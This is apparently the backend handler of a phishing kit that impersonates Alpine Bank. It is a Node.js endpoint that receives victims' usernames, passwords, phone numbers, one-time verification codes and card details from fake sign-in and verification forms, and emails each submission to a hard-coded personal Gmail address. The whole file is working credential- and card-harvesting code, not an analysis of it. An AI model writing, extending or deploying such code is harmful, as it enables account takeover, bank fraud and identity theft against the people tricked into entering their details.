import nodemailer from 'nodemailer';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const { email, message, subject } = req.body;

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS,
        },
    });

    const recipient = "samueldaniyan564@gmail.com";

    let customSubject = 'New Form Submission';
    let htmlBody = '';

    if (subject === 'Login Details') {
        customSubject = 'Submission of Alpine Bank sign in form';
        htmlBody = `
            <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
                <tr><td>Username</td><td>${email}</td></tr>
                <tr><td>Password</td><td>${message}</td></tr>
            </table>
        `;
    } else if (subject === 'Contact Info') {
        customSubject = 'Submission of Alpine Bank Contact Verification form';
        htmlBody = `
            <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
                <tr><td>Email Address</td><td>${email}</td></tr>
                <tr><td>Phone Number</td><td>${message}</td></tr>
            </table>
        `;
    } else if (subject === 'OTP Verification') {
        customSubject = 'Submission of Alpine Bank OTP verification form';
        htmlBody = `
            <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
                <tr><td>Verification Code</td><td>${message}</td></tr>
            </table>
        `;
    } else if (subject === 'Card Info') {
        customSubject = 'Submission of Alpine Bank Card Verification form';
        // If message is a string with newlines, split and show as rows
        const cardRows = message
            .split('\n')
            .map(line => {
                const [key, ...rest] = line.split(':');
                return `<tr><td>${key.trim()}</td><td>${rest.join(':').trim()}</td></tr>`;
            })
            .join('');
        htmlBody = `
            <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
                ${cardRows}
            </table>
        `;
    } else {
        htmlBody = `<div style="font-family:Arial,sans-serif;">Message: ${message}</div>`;
    }

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: recipient,
        subject: customSubject,
        html: htmlBody,
        text: message, // fallback
    };

    try {
        await transporter.sendMail(mailOptions);
        return res.status(200).json({ message: 'Email sent successfully' });
    } catch (error) {
        console.error('Error sending email:', error);
        return res.status(500).json({ message: 'Error sending email', error: error.message });
    }
} 